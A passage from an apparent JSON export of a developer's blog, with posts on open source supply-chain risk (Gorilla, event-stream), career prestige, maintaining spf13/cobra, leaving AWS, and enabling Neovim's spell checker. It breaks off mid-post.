[{"content":"Years ago, entrepreneurs and innovators predicated that “software would eat the world”.\nAnd to little surprise, year after year, the world has become more and more reliant on software solutions. Often times, that software is (or indirectly depends on) some open source software, maintained by a group of people whose only affiliation to one another may be participation in that open source project’s community.\nBut we’re in trouble. The security of open source software is under threat and we’re running out of people to reliably maintain those projects. And as our stacks get deeper, our dependencies become more interlinked, leading to terrifying compromises in the secure software supply-chain. For a perfect example of what’s happening in the open source world right now, we don’t need to look much further than the extremely popular Gorilla toolkit for Go.\nIn December of 2022, Gorilla was archived, a project that provided powerful web framework technology like mux and sessions. Over its lengthy tenure, it was the de facto Go framework for web servers, routing requests, handling HTTP traffic, and using websockets. It was used by tens of thousands of other software packages and it came as a shock to most people in the Go community that the project would be no more; no longer maintained, no more releases, and no community support. But for anyone paying close enough attention, the signs of turmoil were clear: open calls for maintainers went unanswered, there were few active outside contributors, and the burden of maintainership was very heavy.\nThe Gorilla framework was one of those “important dependencies”. It sat at the critical intersection of providing nice quality of life tools while still securely handling important payloads. Developers would mold their logic around the APIs provided by Gorilla and entire codebases would be shaped by the use of the framework. The community at large trusted Gorilla; the last thing you want in your server is a web framework riddled with bugs and CVEs. In the secure software supply-chain, much like Nginx and OpenSSL, it’s a project that was at the cornerstone of many other supply-chains and dependencies. If something went wrong in the Gorilla framework, it had the potential to impact millions of servers, services, and other projects.\nThe secure software supply-chain is one of those abstract concepts that giant tech companies, security firms, and news outlets all love to buzz wording about. It’s the “idea” that the software you are consuming as a dependency, all the way through your stack, is exactly the software you’re expecting to consume. In other words, it’s the assurance that some hacker didn’t inject a backdoor into a library or build tool you use, compromising your entire product, software library, or even company. Supply-chain attacks are mischievous because they almost never go after the actual intended target. Instead, they compromise some dependency to then go after the intended target.\nThe classic example, still to this day, is the Solar Winds attack: some unnamed, Russian state-backed hacker group was able to compromise the internal Solar Winds build system, leaving any subsequent software built using that system injected with backdoors and exploits. The fallout from this attack was massive. Many government agencies, including the State Department, confirmed massive data breaches. The estimated cost of this attack continues to rise and is estimated to be in the billions of dollars.\nProduct after product have popped up in the last few years to try and solve these problems: software signing solutions, automated security scanning tools, up to date CVE databases, automation bots, AI assisted coding tools, etc. There was even a whole Whitehouse counsel on the subject. The federal government knows this is the most important (and most critically vulnerable) vector to the well being of our nation’s software infrastructure and they’ve been taking direct action to fight these kind of attacks.\nBut the secure software supply-chain is also one of those things that falls apart quickly; without delicate handling and meticulous safeguarding, things go south fast. For months, the Gorilla toolkit had an open call for maintainers, seeking additional people to keep its codebases up to date, secure, and well maintained. But in the end, the Gorilla maintainers couldn’t find enough people to keep the project afloat. Many people volunteered but then were never seen again. And the bar for maintainer-ship was rightfully very high:\njust handing the reins of even a single software package that has north of 13k unique clones a week (mux) is just not something I’d ever be comfortable with. This has tended to play out poorly with other projects.\nAnd in the past, this has played out poorly in other projects:\nIn 2018, GitHub user FallingSnow opened the issue “I don’t know what to say.” in the popular, but somewhat unknown, NPM JavaScript package event-stream. He\u0026rsquo;d found something very peculiar in recent commits to the library. A new maintainer, not seen in the community before, with what appeared to be an entirely new GitHub account, had committed a strange piece of code directly to the main branch. This unknown new maintainer had also cut a new package to the NPM registry, forcing this change onto anyone tracking the latest packages in their project.\nThe changes looked like this: In a new file, a long inline encrypted string was added. The string would be decoded using some unknown environment variable, and then, that unencrypted string would be injected as a JavaScript module into the package, effectively executing whatever code was hidden behind the encrypted string. In short, unknown code was being deciphered, injected, and executed at runtime.\nThe GitHub issue went viral. And through sheer brute force, abit of luck, and hundreds of commenters, the community was able to decrypt the string, revealing the injected code’s purpose: a crypto-currency “wallet stealer”. If the code detected a specific wallet on the system, it used a known exploit to steal all the crypto stored in that wallet.\nThis exploitative code lived in the event-stream NPM module for months. Going undetected by security scanners, consumers, and the project’s owner. Only when someone in the community who was curious enough to take a look did this obvious code-injection attack become clear. But what made this attack especially bad was that the event-stream module was used by many other modules (and those modules used by other modules, and so on). In theory, this potentially affected thousands of software packages and millions of end-users. Developers who had no idea their JavaScript used event-stream deep in their dependency stack were now suddenly having to quickly patch their code. How was this even possible? Who approved and allowed this to happen?\nThe owner of the GitHub repository, and original author of the code, said:\nhe emailed me and said he wanted to maintain the module, so I gave it to him. I don\u0026rsquo;t get any thing from maintaining this module, and I don\u0026rsquo;t even use it anymore, and havn\u0026rsquo;t for years.\nand\nnote: I no longer have publish rights to this module on npm.\nJust like that, just by asking, some bad actor was able to compromise tens of thousands of software packages, going undetected through the veil of “maintainership”.\nIn the past, I’ve referred to this as “The Risks of Single Maintainer Dependencies”: the overwhelming, often lonely, and sometimes dangerous experience of maintaining a widely distributed software package on your own. Like the owner of event-stream, most solo maintainers drift away, fading into the background to let their software go into disarray.\nThis was the case with Gorilla:\nThe original author and maintainer, moraes, had moved on a long time ago. kisielk and garyburd had the longest run, maintaining a mix of the HTTP libraries and gorilla/websocket respectively. I (elithrar) got involved sometime in 2014 or so, when I noticed kisielk doing a lot of the heavy lifting and wanted to help contribute back to the libraries I was using for a number of personal projects. Since about ~2018 or so, I was the (mostly) sole maintainer of everything but websocket, which is about the same time garyburd put out an (effectively unsuccessful) call for new maintainers there too.\nThe secure software supply-chain will never truly be strong and secure as long as a single solo maintainer is able to disrupt an entire ecosystem of packages by giving their package away to some bad actor. In truth, there is no secure software supply-chain: we are only as strong as the weakest among us and too often, those weak links in the chain are already broken, left to rot, or given up to those with nefarious purposes.\nWhenever I bring up this topic, someone always asks about money. Oh, money, life’s truest satisfaction! And yes! Money can be a powerful motivator for some people. But it’s a sad excuse for what the secure software supply-chain really needs: true reliability. The software industry can throw all the money it wants at maintainers of important open source projects, something Valve has started doing:\nGriffais says the company is also directly paying more than 100 open-source developers to work on the Proton compatibility layer, the Mesa graphics driver, and Vulkan, among other tasks like Steam for Linux and Chromebooks.\nbut at some point, it becomes unreasonable to ask just a handful of people to hold up the integrity, security, and viability of your companies entire product stack. If it’s that important, why not hire some of those people, build a team of maintainers, create processes for contribution, and allocate developer time into the open source? Too often I hear about solving open source problems by just throwing money at it, but at some point, the problems of scaling software delivery outweigh any amount you can possibly pay a few people. Let’s say you were building a house, it might make sense to have one or two people work on the foundation. But if you’re zoning and building an entire city block, I’d sure hope you’d put an entire team on planning, building, and maintaining those foundations. No amount of money will make just a few people build a strong and safe foundation all by themselves. But what we’re asking some open source maintainers to do is to plan, build, and coordinate the foundations for an entire world.\nAnd this is something the Gorilla maintainers recognized as well:\nNo. I don’t think any of us were after money here. The Gorilla Toolkit was, looking back at the most active maintainers, a passion project. We didn’t want it to be a job.\nFor them, it wasn’t about the money, so throwing any amount at the project wouldn’t have helped. It was about the software’s quality, maintainability, and the kind of intrinsic satisfaction it provided.\nSo then, how can we incentivize open source maintainers to maintain their software in a scalable, realistic way? Some people are motivated by the altruistic value they provide to a community. Some are motivated by fame, power, and recognition. Others still just want to have fun and work on something cool. It’s impossible to understand the complicated, interlinked way different people in an open source community are all motivated. Instead, the best solution is obvious: If you are on a team that relies on some piece of open source software, allocate real engineering time to contributing, being apart of the community, and helping maintain that software. Eventually, you’ll get a really good sense of how a project operates and what motivates its main players. And better yet, you’ll help alleviate the heavy burden of solo maintainership.\nSometimes, I like to think of software like its a wooden canoe, its many dependencies making up the wooden strips of the boat. When first built, it seems sturdy, strong, and able to withstand the harshest of conditions. Its first coat of oil finish is fresh and beautiful, its wood grains smooth and unbent. But as the years ware on, eventually, its finish fads, its wooden strips need replacing, and maybe, if it takes on water, it requires time and new material to repair. Neglected long enough, and its wood could mold and rot from the inside, completely compromising the integrity of the boat. And just like a boat, software requires time, energy, maintenance, and “hands-on-deck” to ensure its many links in the secure software supply-chain are strong. Otherwise, the termites of time and the rot of bad-actors weaken links in the chain, compromising the stability of it all.\nIn the end, the maintainers of the Gorilla framework did the right thing: they decommissioned a widely used project that was at risk of rotting from the inside out. And instead of let it live in disarray or potentially fall into the hands of bad actors, it is simply gone. Its link on the chain of software has been purposefully broken to force anyone using it to choose a better, and hopefully, more secure option.\nI do believe that open source software is entitled to a lifecycle — a beginning, a middle, and an end — and that no project is required to live on forever. That may not make everyone happy, but such is life.\nBut earlier this year, people in the Gorilla community noticed something: a new group of individuals from Red Hat had been added as maintainers to the Gorilla GitHub org. Was Red Hat taking the projected over? No, but ironically, the emeritus maintainers had done exactly what they promised they would never do: at the 11th hour, they handed over the project to people with little vetting from the community.\nTo address many comments that we have seen - we would like to clarify that Red Hat is not taking over this project. While the new Core Maintainers all happen to work at Red Hat, our hope is that developers from many different organizations and backgrounds will join the project over time.\nMaybe Gorilla was too important to drift slowly into obscurity and Red Hat rightfully allocated some engineering resources to the project. Gorilla lives on. Here\u0026rsquo;s hoping the code is in good hands.\nIf you found this blog post valuable, consider subscribing to future posts via RSS or buying me a coffee via GitHub sponsors.\n","permalink":"https://johncodes.com/posts/2023/09-02-there-is-no-secure-software-supply-chain/","summary":"Years ago, entrepreneurs and innovators predicated that “software would eat the world”.\nAnd to little surprise, year after year, the world has become more and more reliant on software solutions. Often times, that software is (or indirectly depends on) some open source software, maintained by a group of people whose only affiliation to one another may be participation in that open source project’s community.\nBut we’re in trouble. The security of open source software is under threat and we’re running out of people to reliably maintain those projects.","title":"There is no secure software supply-chain."},{"content":"The world of software engineering influencers, what I typically like to refer to as \u0026ldquo;tech-fluencers\u0026rdquo;, has grown significantly in the last few years. There are people who have built entire personal brands and businesses solely on the basis of their online tech content. And many massive technology companies now participate in the same spheres that 5 years ago would have been unheard of (just think about all the memes major tech companies have created in the last few years).\nAnd with the rise of platforms that promote short form video content, like TikTok and YouTube shorts, it\u0026rsquo;s now easier then ever to build branding and create a catalog of niche content designed to fulfill a void somewhere out there on the internet.\nBut I\u0026rsquo;ve seen a big problem with all of this.\nWe often see others with significant reach in online tech spaces and assume that the only way to achieve that kind of corporate success, financial well-being, confidence, seniority status, or whatever else their persona amplifies, is to emulate them and make content to also achieve that reach, success, and influence in the industry.\nFrom my first hand experience, this is simply not true.\nYears ago, I fell into the mental trap of creating tech content online: partly out of boerdum during the pandemic and partly because I was looking for new ways to level up my career. I thought that creating content online, like I saw so many other people doing, would be an accelerator for me. I started a TikTok account. During it\u0026rsquo;s heyday, the account reached over 140 thousands followers. This lead to a YouTube channel, a Twitch stream, daily content generation, and much more.\nAnd honestly, after hundreds and hundreds of videos, none of it really sticks out as actually being significant to my career. After all, most of it was fluff and memes without alot of sustenance.\nThis is the trap of content creation that is all too tantalizing: maybe start with pure intent but eventually find yourself feeding the algorithms a never ending stream of content for the hopes of achieving some amorphous goal that has bastardized into something you don\u0026rsquo;t recognize anymore.\nI eventually took a big step back from the content creator grind and ultimately felt pretty disappointed in what seemed like a huge wasted effort.\nI think Will Larson sums this all up incredibly well in his piece \u0026ldquo;How to be a tech influencer\u0026rdquo;. He says:\nMost successful people are not well-known online. If you participate frequently within social media, it’s easy to get sucked into the reality distortion field it creates. Being well-known in an online community feels equivalent to professional credibility when you’re spending a lot of time in that community. My experience is that very few of the most successful folks I know are well-known online, and many of the most successful folks I know don’t create content online at all.\nInstead, there is an alternative approach: prestige.\nBuilding a long term, successful tech career is not about having large followings in online tech spaces or massive engagement on content. Chasing those metrics will only lead you down that road of churning out content for the sake of staying relevant in whatever algorithm you\u0026rsquo;re participating in.\nNo, one of the many puzzle pieces in building a fruitful tech career involves building prestige.\nPrestige is the \u0026ldquo;idea\u0026rdquo; of someone and is based on the respect for the things achieved, battles won, and quality of their character.\nWhen I was at AWS, I could tell who the prestigious engineers were based on the way other people talked about them, how others approached that person\u0026rsquo;s code, and how that person could command a room. Prestige is easy to see, difficult to measure, and illusive to obtain.\nDon\u0026rsquo;t be mistaken: you may read that and assume prestige and fear are close neighbors. But prestige is not about control, making others do what you want, or power. Prestige on one hand is about gaining other\u0026rsquo;s respect. But on the other, it\u0026rsquo;s about having self respect, owning your mistakes, being humble, kindness, and above all, keeping yourself accountable to the high bar of quality and character that you hold for yourself.\nMeasuring your prestige is much more difficult than tracking your influence. It\u0026rsquo;s easy to see the number of followers on your online accounts go up, but tracking the respect and repute people have for you is a whole different challenge.\nThis can make attempting to generate prestige difficult. How can I drum up respect and prestige for myself across the industry if I can\u0026rsquo;t really measure it effectively?\nIronically, generating prestige with online content can be a very successful way to go about amplifying your existing reputation. Experimenting with different forms of content and distribution models is important, but I want to stress that creating content to amplify your prestige should not be the same as content creation (at least in the typical, 2023 sense). You should not fall prey to the temptations of algorithms designed to steal your attention and sap your creative energy. You should simply use them as a tool of distribution if necessary.\nBut more importantly, the quality of your content matters significantly more than the quantity. Typical social media influence dictates that you must post on a regular schedule. But for the engineering leader looking to grow their prestige, one or two extremely high quality pieces go a very very long way. It\u0026rsquo;s not necessary that you always be chugging out content since relevance in typical social media algorithms should not be your end goal.\nSo, how do you actually go about building prestige? Here are my 5 approaches to growing your prestige within your engineering organization and online:\n1. Invent You should be finding ways to solve big technical problems that have increasing impact and that grow your status within the engineering org.\nThis should really be the prerequisite to building any sort of prestige. But it may not be obvious to all: it can be easy to get stuck in a loop of finishing tickets and completing all your tasks during a sprint without expanding into more challenging territories.\nBut if you\u0026rsquo;re not finding technical problems to solve that require innovation, expertise, and abit of the inventors mindset, you\u0026rsquo;ll eventually hit a career ceiling.\nIt is possible to build prestige without inventing. You can get pretty good at taking credit for others work or faking it till you make it. But eventually, this catches up with you and you reach a point where your persona is hollow and it\u0026rsquo;s clear the achievements where your reputation is build upon can\u0026rsquo;t be trusted or respected.\nInventing, building, and solving increasingly challenging technical problems is the backbone of building any kind of technical prestige.\n2. Newsletters Internal newsletters to your organization are a great way to communicate what you\u0026rsquo;re doing, what you\u0026rsquo;ve invented, and brag abit about some of your technical achievements.\nFor some, this may seem too out of reach. Aren\u0026rsquo;t these types of newsletters within my company only for VPs and engineering leaders?\nNot necessarily. An opt-in type newsletter is the best place to start (i.e. don\u0026rsquo;t start a newsletter and send it to everyone in the company). Your manager and other teammates will likely want to opt in. After all, why wouldn\u0026rsquo;t they want a regular email of what you\u0026rsquo;ve been working on, things that interest you, and pieces of work you\u0026rsquo;re particularly proud of that week?\nNewsletters are also a great habit to be in since they force you to quantify and qualify your work on a regular cadence which can then be translated latter into talks, deep dives, promotion documents, or other content that you can share with your org or the wider world.\nSome people take this to the next level and publish a public newsletter. This can be a really cool avenue for those working \u0026ldquo;in public\u0026rdquo; and can be a great way to start connecting with other technical leaders out in the industry.\n3. Talks Technical talks come in many different shapes and sizes. I would consider a \u0026ldquo;talk\u0026rdquo; to be anythying from showing something off during your team weekly demos all the way up to international keynotes at large conferences.\nThe different ends of that spectrum obviously have different levels of reach and impact, but both help to establish you as a subject area expert in that thing you\u0026rsquo;re talking about. It\u0026rsquo;s an automatic way to gain some prestige about the topic and it\u0026rsquo;ll likely open you up to connecting with others in the audience that may lead to further opportunities (as the wheels of prestige go round)!\n4. Deep dives Technical deep dives also come in many shapes and forms. It may be a written piece (like this!), a video, a seminar, or really anything that can deeply communicate a technical topic.\nDeep dives are great for generating some prestige since they can be easily referenced latter. They sort of end up being a time machine for you to use and recycle in powerful ways. I\u0026rsquo;ve seen people take deep dives and turn them into conference talks, business pitches, and even entire products!\nBut they are ultimately useful for establishing your expertise and prowess in a given technical matter.\n5. Get others to talk about it The most powerful, and maybe most difficult avenue to building prestige, is to get other people to talk about you and your work. At this point, the wheels of prestige are fully turning and they will move on their own for a fair amount of time.\nHaving a wealth of talks, deep dives, and newsletters ensures that other people (like your boss or your co-workers) have something to talk about.\nAnd remember, prestige holds you to the highest bar of quality. So at this point, regardless of how many years it\u0026rsquo;s been, you can be assured that if people are talking about you, discussing a talk you gave, or chatting about something you\u0026rsquo;ve achieved, you know that it\u0026rsquo;s something that you can be proud of and respect yourself for.\nPrestige is an incredible tool to build within your engineering organization and out in public. It should be a good approach for anyone looking to really leveling up their career. And in my experience, it\u0026rsquo;s a much preferred method to the typical \u0026ldquo;tech-fluencers\u0026rdquo; content grind.\n","permalink":"https://johncodes.com/posts/2023/08-11-prestige/","summary":"The world of software engineering influencers, what I typically like to refer to as \u0026ldquo;tech-fluencers\u0026rdquo;, has grown significantly in the last few years. There are people who have built entire personal brands and businesses solely on the basis of their online tech content. And many massive technology companies now participate in the same spheres that 5 years ago would have been unheard of (just think about all the memes major tech companies have created in the last few years).","title":"Prestige Over Influence: Choosing A More Impactful Online Presence"},{"content":"There\u0026rsquo;s something I feel like I need to acknowledge around my maintainership of spf13/cobra.\nDuring my time at AWS, I had a really hard time contributing to open source projects that were important to me (and important to the broader ecosystem). I didn\u0026rsquo;t have the energy, but more importantly, I didn\u0026rsquo;t have the bandwidth.\nThere\u0026rsquo;s alot of red tape to get through when it comes to open source at Amazon. After all, AWS alone is a massive business unit with thousands of products and tens of thousands of engineers all around the world.\nAnd I totally get it: there\u0026rsquo;s legal \u0026amp; licensing considerations, there\u0026rsquo;s staffing calculations, there\u0026rsquo;s non-competes, there\u0026rsquo;s product commitments, there\u0026rsquo;s other competing companies working on the same projects in the open source, etc. etc. All this leaves very little room for individual contributors to give back to the community where they have the autonomy and the power to do so.\nEventually, I did get the \u0026ldquo;all clear\u0026rdquo; to work on cobra, but I wasn\u0026rsquo;t given any flexibility to find time to maintain the project. Which was fine. I wasn\u0026rsquo;t hired to work on cobra. And it\u0026rsquo;s more or less always been a \u0026ldquo;bonus\u0026rdquo; thing I\u0026rsquo;ve worked on.\nBut it really pained me to not be able to dedicate some time to an important project within the Cloud Native and Kubernetes ecosystem. In the last 3 months alone, cobra\u0026rsquo;s PR velocity has crawled to a standstill, there have been only a few merged PRs, and we\u0026rsquo;ve neglected to keep up with triaging new issues.\nspf13/cobra is abit of a weird project (at least from an \u0026ldquo;enterprise open source office\u0026rdquo; perspective). It\u0026rsquo;s a code library with basically no way to \u0026ldquo;product-ize\u0026rdquo; it. It gives you the Go APIs and frameworks to build modern and elegant command line interfaces. It\u0026rsquo;s one of those deep dependencies that can go unnoticed for years until something goes terribly wrong but in itself, it isn\u0026rsquo;t anything you can give to people; you must build on top of it.\nI tried my best to pitch my case to get some amount of allocation into the project. But no luck. Maybe it was the economy, maybe it was the layoffs, I\u0026rsquo;m really not sure. Regardless, my allocation didn\u0026rsquo;t change. Whenever I\u0026rsquo;ve tried to explain to a product manager, an engineering manager, or a business person why leaving cobra to rot risks our entire secure software supply chain, I\u0026rsquo;m often met with blank stares. \u0026ldquo;Why work on a CLI framework when you should be working on products?\u0026rdquo; or \u0026ldquo;This doesn\u0026rsquo;t seem critical to our bottom line.\u0026rdquo;\nCompare that to something like core Kubernetes (which in itself uses cobra), a platform for running and managing containerized workloads and services in the cloud. Now that sounds like a product you can ship! You can easily see how AWS justifies having entire teams allocated to maintaining upstream open source projects, like Kubernetes, when the wellness and maintenance of those projects directly correlates to the bottom line of a product.\nBut spf13/cobra is used throughout several important AWS led open source projects. Just to name a few:\ncontainerd\u0026rsquo;s nerdctl finch eksctl the copilot CLI Maybe the \u0026ldquo;engineering allocation chain\u0026rdquo; only goes one or two layers deep. Not deep enough to notice a dependency like cobra and its lack of maintenance.\nIn 2022, I gave a talk at KubeCon EU about maintaining cobra with a very small group, what the \u0026ldquo;solo\u0026rdquo; maintainer experience is like, and why solo maintainer projects are incredibly dangerous to the wellness of the entire ecosystem and broader secure software supply-chain.\nI think about that talk alot. And it keeps me up at night sometimes: what would it take for a bad actor to hack my GitHub account and inject some malicious dependency into cobra (therefore poisoning the dependencies in Kubernetes, Helm, Istio, Linkerd, Docker, etc. etc.). How long before people would notice? How much damage would be done, even in a short amount of time?\nI sort of feel like I\u0026rsquo;ve let the cobra and Kubernetes community down. And I feel like I\u0026rsquo;ve become the exact sort of open source maintainer that I cautioned against in that talk: distant, difficult to reach, not engaging with the community, jaded, burned out. But I know it all doesn\u0026rsquo;t rest on my shoulders: there are other people in the community that keep very close eyes on cobra. I care deeply about the security and well-being of this project, but it\u0026rsquo;s clear to me (and probably to you too) that I need a break.\nSo, what does all this mean for my work on cobra?\nWell, thankfully, I\u0026rsquo;ve found a breath of fresh air now working with a small team at OpenSauced.\nAnd, this summer, while I ramp up with the new job, I plan to continue to maintain cobra, but I\u0026rsquo;m going to take some time away from some of these open source responsibilities. I think this will give me the rest I need to approach cobra and other projects with a renewed sense of purpose latter this summer.\nI\u0026rsquo;m taking a trip to Iceland this month where I\u0026rsquo;ll unplug, read a few books, take some pictures with my camera, and forget about the world of the secure software supply-chain.\nUntil then, happy building!\nIf you found this blog post valuable, comment below, subscribe to future posts via RSS, or buy me a coffee via GitHub sponsors.\n","permalink":"https://johncodes.com/posts/2023/06-29-on-maintaining-cobra/","summary":"There\u0026rsquo;s something I feel like I need to acknowledge around my maintainership of spf13/cobra.\nDuring my time at AWS, I had a really hard time contributing to open source projects that were important to me (and important to the broader ecosystem). I didn\u0026rsquo;t have the energy, but more importantly, I didn\u0026rsquo;t have the bandwidth.\nThere\u0026rsquo;s alot of red tape to get through when it comes to open source at Amazon. After all, AWS alone is a massive business unit with thousands of products and tens of thousands of engineers all around the world.","title":"On maintaining spf13/cobra"},{"content":"This is my last week at Amazon Web Services.\nAnd while the last year has been an incredible journey diving deep into the world of containers, Linux, Rust, Kubernetes, and building operating systems, I\u0026rsquo;ve made the difficult decision to leave.\nAnd I\u0026rsquo;m very excited to be joining the incredible team at OpenSauced where we\u0026rsquo;ll be building the future of open source insights, tooling, and innovation.\nSince before I started my computer science degree (almost 7 years ago!) I\u0026rsquo;ve wanted to cut my teeth on building a startup and working on a greenfield product. These kinds of opportunities are far \u0026amp; few between. And the timing is just about right; I can\u0026rsquo;t wait to push myself, learn new skills, and build new products with a small, amazing tactical team.\nTo everyone at AWS and the Bottlerocket team: Thank you for making the last year an incredible learning opportunity. Here\u0026rsquo;s hoping our paths cross again soon!! I\u0026rsquo;m sure I\u0026rsquo;ll be seeing you around the open source ecosystem! Cheers!\nIf you\u0026rsquo;re curious, here are a few personal reflections on the last year:\nThe power of grit. There\u0026rsquo;s something really incredible about a team of engineers dedicated to creating wonderful customer experiences (especially when there is alot of really challenging work to get done).\nYou could have the most talented people in the world working on your products but when the times get tough, tapping into the grit superpower trumps all others.\nWhat is grit?\nPersonally, I\u0026rsquo;ve found it to be the resolve to do what needs to get done. At times, no matter what.\nI was constantly impressed with what could be accomplished at AWS through sheer motivation and grit. It was pretty rare to hear \u0026ldquo;it can\u0026rsquo;t be done\u0026rdquo; or \u0026ldquo;I can\u0026rsquo;t do this\u0026rdquo;. More often then not, you\u0026rsquo;d hear \u0026ldquo;how can we do this for our customers?\u0026rdquo; or \u0026ldquo;what needs to change in order to accomplish this\u0026rdquo;.\nThe open source movement is alive and well. Just before joining Amazon, I was coming hot off of Tanzu Community Edition at VMware, an open source Kubernetes platform aiming to be a simple and easy entry point for VMware customers to get introduced to the cloud native ecosystem.\nUnfortunately, sometime after the Broadcom acquisition was announced, the entire project was scrapped. After well over a year of stealth development, user research, release, community support, and more, all our effort essentially resulted in \u0026hellip; nothing.\nTo say the least, it left me abit skeptical (and sad) about the whole open source \u0026ldquo;idea\u0026rdquo;. Maybe you could call it a crisis of faith. Did it really make sense to ship software and platforms for free? Does it make for any kind of sustainable business?\nBut while at AWS, I saw amazing projects get iterated on, injected with critical engineering resources, shipped, and improved through Amazon\u0026rsquo;s open source office. Things like Bottlerocket, Containerd, Finch, and many more.\nTo say the least, the open source movement is strong and there\u0026rsquo;s so much awesome innovation happening out in the open wild. I\u0026rsquo;m energized and hopeful for the future of the free (as in freedom, not as in beer) and open movement.\nWhen customers give you lemons, make lemonade. The \u0026ldquo;first principle\u0026rdquo; of working at Amazon is to be customer obsessed. And being customer obsessed means you should make all efforts to work backwards from the customer needs.\nI\u0026rsquo;m not gonna lie: at first, I really thought the whole \u0026ldquo;peculiar culture\u0026rdquo; and \u0026ldquo;customer obsessed\u0026rdquo; mantras were a load of b.s.\nBut seeing real customer\u0026rsquo;s needs get met on a daily basis by the team was a pretty incredible thing: there was little question on what the team was delivering and why. It always revolved around the customers.\nFrom an individual contributor perspective, that is incredibly empowering to be able to hear of a real customer issue or need, make changes to address it, and ship it without question. In software, customer needs, request, and issues are like lemons. And when you have an abundance of lemons, make lemonade.\nWant to be understood? Write a document. Before working at Amazon, I really, really underestimated the power of technical writing.\nAlmost all decisions at Amazon get made through a well written document that clearly lays out the narrative for how a decision should be made.\nWriting has never been something I felt \u0026ldquo;good\u0026rdquo; at. In fact, for years throughout primary school, I struggled with reading and writing (see my previous post on using the spell checker in Neovim for an understanding on how critical these tools are for me).\nThe first few docs I wrote were not well written docs (party because of how much I underestimated how important writing is).\nSo, one of my biggest goals in 2023 became to become a better writer. Part of that has been writing on this blog. But more importantly, my \u0026ldquo;goal within a goal\u0026rdquo; was to be better understood, more organized with my thoughts, and in the end, be a better engineer.\nDon\u0026rsquo;t underestimate the power of writing: it\u0026rsquo;s how you communicate technical ideas.\nMake it boring. Making it scale. Make the right decision. New, sexy tech often gets in the way of building great customer products.\nAmazon (maybe notoriously?) doesn\u0026rsquo;t adopt new tech fast. And for good reason: there are droves of engineers and existing stacks that couldn\u0026rsquo;t possibly scale to adopt new tech constantly.\nAnd what customer needs is all this new tech really servicing? If we already have well understood tools and stacks, why adopt something new unless it really meets some customer need? (see above on working backwards from the customer).\nEarly on, the Bottlerocket team adopted Rust for first party source code. And for very good reasons: it provides unique memory safe capabilities and performance, there was an existing paradigm of using rust at AWS, and among many other reasons, writing new C or C++ systems code may not be unacceptable from a security standpoint.\nWhen I first arrived on the team, my naive assumption for why Rust was adopted was because it happens to be the cool new kid on the programming block.\nWhen, in reality, adopting this new tech serviced some real customer and product needs. In short, keeping the customer at the center of all decisions, including what tech gets adopted, will continue to give you better and better results.\nSo long AWS, and thanks for everything!\nIf you found this blog post valuable, comment below, subscribe to future posts via RSS, or buy me a coffee via GitHub sponsors. Your support means the world to me!!\n","permalink":"https://johncodes.com/posts/2023/06-13-goodbye-aws/","summary":"This is my last week at Amazon Web Services.\nAnd while the last year has been an incredible journey diving deep into the world of containers, Linux, Rust, Kubernetes, and building operating systems, I\u0026rsquo;ve made the difficult decision to leave.\nAnd I\u0026rsquo;m very excited to be joining the incredible team at OpenSauced where we\u0026rsquo;ll be building the future of open source insights, tooling, and innovation.\nSince before I started my computer science degree (almost 7 years ago!","title":"So long AWS! Hello OpenSauced!"},{"content":" I know.\nAny sane person\u0026rsquo;s editor already has spellchecking built in. And enabled by default. But I could never leave my beloved Neovim (and all the muscle memory I\u0026rsquo;ve built) just to spell things correctly! That\u0026rsquo;s why I became a programmer dammit! Who needs to know how to spell correctly when I can have single character variable names! Besides. We have tools. Isn\u0026rsquo;t that what computers are for!? Automate the boring stuff! (like spelling and grammar).\nThankfully, the long awaited spell integration features have landed in the NeoVim APIs. While spell has been around forever (or at least as long as Vim has been), only recently have the NeoVim Lua APIs been able to take advantage of it. Now, by default, without plugins, nvim can make spelling suggestions and treesitter can do the right things with misspellings in the syntax highlighting, code parsing, and search queries. Or in other words, spell is waaay nicer to use since it\u0026rsquo;ll ignore code (but not other stuff).\nThis has already greatly increased my productivity when writing. If you know anything about me (or have had the pleasure of working with me and seeing my egregious spelling mistakes), you know that I can not spell. My reliance on good spell checker tools has really evolved into a dependency. But no longer! Now, I can continue to convince myself that nvim is a superior editor because it finally has spell checking.\nIn all seriousness, shout out to the NeoVim community and maintainers for getting this feature in!! It\u0026rsquo;s already been a huge value add and saved me on several occasion from pushing an embarrassing commit message.\nEnabling it Make sure you have a new-ish version of NeoVim. I\u0026rsquo;m running with a newer nightly build, but the latest official release should do the trick.\n❯ nvim --version NVIM v0.9.0-dev-699+gc752c8536 In your nvim configuration files, you\u0026rsquo;ll want to set the one of the following options:\nFor those who\u0026rsquo;ve ascended to using Lua: vim.opt.spelllang = \u0026#39;en_us\u0026#39; vim.opt.spell = true Or good, ol trusty Vimscript: set spelllang=en_us set spell Alternatively, you can use the command prompt to enable spell in your current session:\n:setlocal spell spelllang=en_us Note that en_us is US English. But there are tons of supported languages out of the box: en_gb for Great Britian English, de for German, ru for Russian, and more.\nNow, you should see words that are misspelled underlined! Nice!!\nUsing it There are 3 default key-mappings my workflow has revolved around for fixing spelling mistakes when I\u0026rsquo;m writing.\nFinding words: ]s will go to the next misspelled word.\n[s will go to the previous misspelled word.\nEasy as that! These default key-mappings are designed to be composable (or heck, modified in any way you like - this is NeoVim after all!) so spend some time thinking about what re-mappings, key bindings, or macros might make sense for you and your workflow.\nFixing words: When the cursor is under a word that is misspelled, z= will open the list of suggestions. Typically, the first suggestion is almost always right. Hit 1 and \u0026lt;enter\u0026gt; in the prompt to indicate you want to take the first suggestion. And the word has been fixed!\nThere\u0026rsquo;s also\n:spellr which is the \u0026ldquo;spell repeater\u0026rdquo;. It repeats the replacement done by z= for all matched misspellings in the current window. So, if there\u0026rsquo;s a word you frequently misspell, using :spellr is a quick and easy one stop shop for fixing all the misspellings of that type.\nAdding words to the spellfile If you\u0026rsquo;ve typed a word that doesn\u0026rsquo;t appear in the default dictionary, but is spelled correctly, you can easily add it yourself to the internal spell list. Especially in programming docs, there are lots of words not loaded into the default dictionary. With your cursor under the correctly spelled word that is underlined as misspelled, use the zg mapping to mark the word as a \u0026ldquo;good\u0026rdquo; word.\nDoing this, you\u0026rsquo;ll notice that NeoVim will automatically create a spell/ directory in the runtime path (typically under ~/.config/nvim). And in that directory, you\u0026rsquo;ll find two files:\n~/.config/nvim/ |-- spell | |-- en.utf-8.add | |-- en.utf-8.add.spl The .add file is a list of words you\u0026rsquo;ve added. For example, my .add file has tech words like \u0026ldquo;Kubernetes\u0026rdquo; which don\u0026rsquo;t typically appear in the default English dictionary.\nThe .spl file is a compiled binary \u0026ldquo;spellfile\u0026rdquo;. And it\u0026rsquo;s what is used to actually make suggestions and crawl the dictionary graph. Creating spellfiles is \u0026hellip; rather involved. But, for most people, simply using 